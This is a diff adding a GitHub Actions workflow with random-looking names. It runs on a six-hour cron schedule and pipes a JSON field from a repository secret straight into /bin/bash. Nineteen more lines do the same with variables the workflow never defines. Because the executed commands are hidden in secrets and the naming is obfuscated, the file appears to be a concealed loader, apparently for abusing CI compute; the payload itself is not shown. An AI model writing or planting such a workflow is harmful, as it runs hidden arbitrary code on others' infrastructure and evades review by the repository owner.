@@ -1,0 +1,35 @@
+name: peiyuanxie2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: peiyuanxie2603
+        env:
+          v2491: ${{ secrets.v2491 }}
+        run: |
+          echo $v2491 | jq -r .sst999 | /bin/bash
+          echo $mjuer97557 | jq -r .rocec8 | /bin/bash
+          echo $fi7683 | jq -r .k667 | /bin/bash
+          echo $cleo2 | jq -r .nl3 | /bin/bash
+          echo $fkxo2 | jq -r .ef0120 | /bin/bash
+          echo $zp5 | jq -r .nuhua467 | /bin/bash
+          echo $schef516 | jq -r .ufjdi9 | /bin/bash
+          echo $ul06 | jq -r .di1706 | /bin/bash
+          echo $u14 | jq -r .yd61 | /bin/bash
+          echo $zfr89226 | jq -r .ihus768 | /bin/bash
+          echo $fgr37 | jq -r .v7836 | /bin/bash
+          echo $rkna3505 | jq -r .vaye83466 | /bin/bash
+          echo $xo4 | jq -r .ms93 | /bin/bash
+          echo $yame5 | jq -r .aiz47389 | /bin/bash
+          echo $ymqbo0 | jq -r .zz40 | /bin/bash
+          echo $hwh7367 | jq -r .ezq44565 | /bin/bash
+          echo $zqye43111 | jq -r .lf8 | /bin/bash
+          echo $hbbxt2 | jq -r .aqsb8 | /bin/bash
+          echo $axum950 | jq -r .sztln8 | /bin/bash
+          echo $aifn4427 | jq -r .gdkup5 | /bin/bash
+
